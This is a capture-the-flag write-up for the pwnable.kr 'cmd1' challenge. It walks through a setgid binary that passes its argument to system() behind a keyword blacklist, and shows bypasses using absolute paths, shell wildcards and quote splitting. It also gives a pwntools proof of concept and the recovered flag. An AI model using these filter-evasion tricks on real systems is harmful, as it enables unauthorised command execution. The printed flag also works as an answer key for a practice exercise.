# pwnable.kr cmd1 writeup (1 pt)

```
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```

Alright, let's connect to the target server.

# 0x01 Binary Enumeration

```bash
cmd1@prowl:~$ ls -la
total 40
drwxr-x---   5 root cmd1     4096 Mar 23  2018 .
drwxr-xr-x 116 root root     4096 Nov 12 21:34 ..
d---------   2 root root     4096 Jul 12  2015 .bash_history
-r-xr-sr-x   1 root cmd1_pwn 8513 Jul 14  2015 cmd1
-rw-r--r--   1 root root      320 Mar 23  2018 cmd1.c
-r--r-----   1 root cmd1_pwn   48 Jul 14  2015 flag
dr-xr-xr-x   2 root root     4096 Jul 22  2015 .irssi
drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
cmd1@prowl:~$ 
```

We have the vulnerable binary, the source code & the flag file. Let's start by analyzing the source code.

```C
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

As we can see we have 2 functions, the main() & the filter() function. At filter function we can see that words `flag`, `sh`, `tmp` are blacklisted & we can't use them. We have to find a way to bypass that.

# 0x02 Exploitation + PoC

+ 1way Wildcards

```bash
cmd1@prowl:~$ ./cmd1 "/bin/cat *"
rand0000m_sh1tz_l0l
mommy now I get what PATH environment is for :)
```


```bash
cmd1@prowl:~$ ./cmd1 "/bin/cat fl?g"
mommy now I get what PATH environment is for :)
```

+ 2way single quotes

```bash
cmd1@prowl:~$ ./cmd1 "/bin/cat f'la'g"
mommy now I get what PATH environment is for :)
```

I wrote a simple PoC with pwntools.

```python
#!/usr/bin/env python
from pwn import *

shell = ssh('cmd1', 'pwnable.kr', password='guest', port=2222)
sh = shell.run('./cmd1 "/bin/cat fla?"')
log.success("Flag : " + sh.recvline())
```

Let's fire it up!

```bash
[root@pwn4magic]:~/Desktop# python cmd1.py 
[+] Connecting to pwnable.kr on port 2222: Done
[*] cmd1@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Opening new channel: './cmd1 "/bin/cat fla?"': Done
[+] Flag : mommy now I get what PATH environment is for :)
[*] Closed SSH channel with pwnable.kr
```

Flag : `mommy now I get what PATH environment is for :)`

-pwn4magic
